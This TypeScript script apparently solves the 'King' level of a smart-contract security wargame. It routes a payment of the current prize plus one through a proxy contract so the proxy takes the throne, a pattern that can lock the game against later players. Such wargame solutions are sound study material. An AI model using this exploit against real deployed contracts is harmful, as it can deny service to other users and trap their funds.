// Runtime Environment's members available in the global scope.
import { BigNumber, ethers, Signer } from "ethers";
import { Interface } from "ethers/lib/utils";
import { getSigner } from "./signer";
import { King__factory } from "../typechain/ethers-v5";
import { ProxyCall__factory } from "../typechain";


async function main() {
  const instanceAddress = "0xf35Ffd2Ac71cE877f670F0207C04a15767f110eb";
  const signer = getSigner();
  const ct = King__factory.connect(instanceAddress, signer);
  console.log("king:", await ct._king());
  console.log("prize:", (await ct.prize()).toString());
  const overtakePrize = (await ct.prize()).add(1);

  // const proxy = await (new ProxyCall__factory(signer)).deploy();
  const proxy = ProxyCall__factory.connect('0x6C8eb610245551644DC43cf049641210576a40B2', signer);
  await proxy.deployed();
  console.log("deployed proxy:", proxy.address);
  const methodSignature = (new Interface(abi)).encodeFunctionData("receive",[]);

  const tx = await proxy.proxy(instanceAddress, [] ,{ value:overtakePrize, gasLimit: 950000,  });
  console.log(await tx.wait());

  console.log("king:", await ct._king());
  console.log("prize:", (await ct.prize()).toString());
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [  
  {
    "inputs": [    ],
    "name": "receive",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
]